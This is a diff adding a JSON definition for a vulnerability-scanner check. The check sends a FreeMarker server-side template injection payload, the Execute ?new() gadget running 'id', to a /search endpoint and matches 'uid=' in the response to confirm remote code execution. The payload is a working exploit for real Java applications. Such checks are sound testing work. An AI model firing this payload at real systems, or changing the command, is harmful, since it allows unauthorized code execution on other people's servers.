@@ -1,0 +1,30 @@
+{
+  "name": "web/Freemarker SSTI RCE Execute gadget",
+  "description": "[god] Freemarker SSTI to RCE via the Execute ?new() gadget (CWE-94; PayloadsAllTheThings Java SSTI): <#assign x='freemarker.template.utility.Execute'?new()>${x('id')} instantiates the exec class — command output lands in the response. Escalation over the pack's ${7*7} arith proof. Keywords: freemarker ssti rce execute new gadget java template injection. ctrl: benign query renders without command output -> not falsified. base_url = template-rendering endpoint.",
+  "cwe": "CWE-94",
+  "requests": {
+    "payload": {
+      "method": "POST",
+      "url": "{{base_url}}/search",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "q=<#assign x=\"freemarker.template.utility.Execute\"?new()>${x(\"id\")}"
+    }
+  },
+  "conditions": [
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "uid=\\d+\\("
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "aa4fe20760a1",
+  "created": "2026-11-06T00:00:00+00:00",
+  "last_used": "2026-11-06T00:00:00+00:00"
+}
